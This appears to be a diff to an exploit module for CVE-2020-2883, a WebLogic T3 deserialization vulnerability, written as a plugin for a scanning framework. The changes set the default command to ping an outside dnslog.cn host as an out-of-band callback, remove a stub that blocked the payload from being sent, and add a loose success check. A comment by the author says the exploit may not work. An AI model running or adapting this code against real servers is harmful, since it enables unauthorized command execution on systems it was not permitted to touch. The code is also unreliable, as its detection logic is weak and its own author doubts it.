@@ -2,7 +2,7 @@
 # _*_ coding:utf-8 _*_
 # CVE-2020-2883
 # updated 2020/06/09
-# by zhzyker
+# by zhzyker（exploit unsuccessful, maybe wrong）
 
 import re
 import socket
@@ -20,7 +20,7 @@ class CVE_2020_2883(Star):
     }
     type = target_type.VULNERABILITY
 
-    def light_up(self, dip, dport, delay=2, timeout=5, cmd='whoami', *args, **kwargs) -> (bool, dict):
+    def light_up(self, dip, dport, delay=2, timeout=5, cmd='ping 5nf3bz.dnslog.cn', *args, **kwargs) -> (bool, dict):
         # 对端响应数据需要一段时间，使用 delay 来控制，如果不成功，可以加到 3s 左右，超过这个基本都是打了补丁的
         # t3 handshake
         dport = int(dport)
@@ -58,10 +58,10 @@ class CVE_2020_2883(Star):
         sock.send(bytes.fromhex(payload))
         time.sleep(delay)
         sock.send(bytes.fromhex(payload))
-        raise NotImplementedError('undefine.')
+        # raise NotImplementedError('undefine.')
         try:
             res = sock.recv(4096)
             # r = re.search(b'\\$Proxy[0-9]+', res)
-            # return not r is None, {'msg': 'finish.'}
+            return b'weblogic' in res, {'msg': 'finish.'}
         except socket.timeout:
             return False, {'msg': 'connection timeout.'}
